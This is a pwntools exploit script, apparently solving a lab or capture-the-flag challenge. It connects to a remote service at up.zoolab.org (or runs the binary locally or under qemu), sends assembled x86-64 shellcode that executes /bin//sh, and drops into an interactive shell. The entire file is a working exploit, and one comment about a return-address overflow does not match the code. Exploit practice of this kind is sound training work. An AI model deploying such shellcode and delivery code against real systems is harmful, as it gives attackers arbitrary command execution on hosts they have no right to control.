#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *
import sys

context.arch = 'amd64'
context.os = 'linux'

exe = './shellcode'
port = 10257

# elf = ELF(exe)
# off_main = elf.symbols[b'main']
base = 0
qemu_base = 0

r = None
if 'local' in sys.argv[1:]:
    r = process(exe, shell=False)
elif 'qemu' in sys.argv[1:]:
    qemu_base = 0x4000000000
    r = process(f'qemu-x86_64-static {exe}', shell=True)
else:
    r = remote('up.zoolab.org', port)

shellcode = """
xor rax, rax
push rax
mov rdi, 0x68732f2f6e69622f
push rdi
mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
mov rax, 59
syscall
"""
# 32 byte + return address (16 A, 16 A, return address (msg))

#exec binsh
payload = asm(shellcode)


r.recvuntil("code> ")
r.send(payload)
r.interactive()

# vim: set tabstop=4 expandtab shiftwidth=4 softtabstop=4 number cindent fileencoding=utf-8 :
